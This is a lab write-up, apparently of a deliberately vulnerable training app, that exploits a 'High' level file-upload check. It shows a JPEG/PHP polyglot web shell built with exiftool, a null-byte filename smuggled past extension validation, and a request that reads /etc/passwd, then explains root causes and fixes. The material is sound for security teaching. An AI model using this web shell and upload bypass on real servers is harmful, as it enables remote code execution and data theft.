# File Upload — High

## Overview

The High security level introduces multiple file upload validations:

- **File Extension:** Only `jpg`, `jpeg`, and `png` extensions are accepted.
- **File Size:** The uploaded file must be smaller than 100,000 bytes.
- **Image Validation:** `getimagesize()` checks whether the uploaded file contains valid image data.

Despite these checks, the upload functionality can still be exploited using a combination of a Null Byte filename technique and a JPEG/PHP polyglot file.

## Source Code Analysis

```php
$uploaded_name = $_FILES['uploaded']['name'];
$uploaded_ext  = substr(
    $uploaded_name,
    strrpos($uploaded_name, '.') + 1
);
$uploaded_size = $_FILES['uploaded']['size'];
$uploaded_tmp  = $_FILES['uploaded']['tmp_name'];

if (
    (
        strtolower($uploaded_ext) == "jpg" ||
        strtolower($uploaded_ext) == "jpeg" ||
        strtolower($uploaded_ext) == "png"
    ) &&
    ($uploaded_size < 100000) &&
    getimagesize($uploaded_tmp)
) {
    move_uploaded_file($uploaded_tmp, $target_path);
}
```

The application validates the filename extension, file size, and image content. However, these checks do not establish that the uploaded file is safe or prevent it from containing executable PHP code.

## Exploitation

### 1. Creating a JPEG/PHP Polyglot

A valid JPEG image was used as a carrier for PHP code embedded in its image comment.

```bash
exiftool -Comment='<?php echo "START ========== " . system($_GET["cmd"]) . " ============== END"; ?>' image.jpg -o polyglot.php
```

The resulting file contains valid JPEG data alongside the embedded PHP payload.

This allows the file to pass `getimagesize()` while retaining PHP code that can execute if the server processes the file as PHP.

### 2. Null Byte Filename Technique

The upload request was intercepted using Burp Suite, and the filename was changed to:

```http
filename="exploit.php%00.jpg"
```

The `.jpg` extension satisfies the application's extension validation.

The Null Byte (`%00`) technique targets the way older PHP/file-handling implementations process filenames, potentially causing the filename to be treated as ending before `.jpg`.

### 3. Upload Request

The relevant multipart request fields were:

```http
Content-Disposition: form-data; name="uploaded"; filename="exploit.php%00.jpg"
Content-Type: application/x-php

[ JPEG image data + embedded PHP code ]
```

The server returned:

```html
<pre>../../hackable/uploads/exploit.php%00.jpg succesfully uploaded!</pre>
```

The response confirms that the application accepted the upload.

### 4. Executing the Uploaded Payload

The uploaded file was accessed with the following request:

```http
GET /hackable/uploads/exploit.php?cmd=cat+/etc/passwd HTTP/1.1
```

The server returned the contents of `/etc/passwd`, confirming that the embedded PHP payload was executed and the supplied operating system command ran successfully.

## Root Cause

The vulnerability results from relying on insufficient file validation:

- Extension validation can be affected by filename parsing inconsistencies.
- `getimagesize()` verifies image structure but does not detect embedded executable code.
- The application stores uploaded files in a web-accessible directory where PHP execution is possible.

The combination of these weaknesses allows an attacker to upload a file containing PHP code and potentially execute it through the web server.

## Impact

Successful exploitation results in **Remote Code Execution (RCE)** under the privileges of the web server process.

An attacker may execute operating system commands, access files readable by the web server, and potentially compromise application data.

## Conclusion

The High security level attempts to validate uploaded files through extension, size, and image-content checks. However, these protections are insufficient when filename handling can be abused and valid image files can contain executable code.

Secure file upload handling should use strict server-side validation, safe filename generation, storage outside the web root, and prevent script execution in upload directories.
